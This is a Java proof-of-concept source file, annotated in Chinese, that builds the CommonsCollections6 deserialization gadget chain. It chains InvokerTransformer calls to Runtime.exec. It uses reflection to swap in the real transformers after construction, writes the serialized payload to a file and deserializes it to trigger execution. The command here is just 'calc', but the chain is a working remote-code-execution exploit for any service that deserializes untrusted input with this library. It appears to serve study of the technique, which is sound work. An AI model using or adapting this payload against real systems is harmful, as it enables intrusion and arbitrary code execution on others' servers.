import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {

        /*
         * 客户端构造payload，并序列化文件
         * */

        //写一个fake的trasnformers
        Transformer[] fakeTransformers = new Transformer[]{
                new ConstantTransformer(String.class)
        };
        //这是真的transformer
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        innerMap.put("1","2");
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"leihehe");//让TiedMapEntry里的map为lazyMap,key随意
        Map serMap = new HashMap();
        serMap.put(tiedMapEntry,"111");
        lazyMap.remove("leihehe");
        /* 把有用的transformer换回来 */
        Field myTransformers = chainedTransformer.getClass().getDeclaredField("iTransformers");
        myTransformers.setAccessible(true);
        myTransformers.set(chainedTransformer,transformers);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream("lz.cer");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(serMap);//序列化
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream("lz.cer");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();//只需要readObject()就会触发漏洞
    }
}
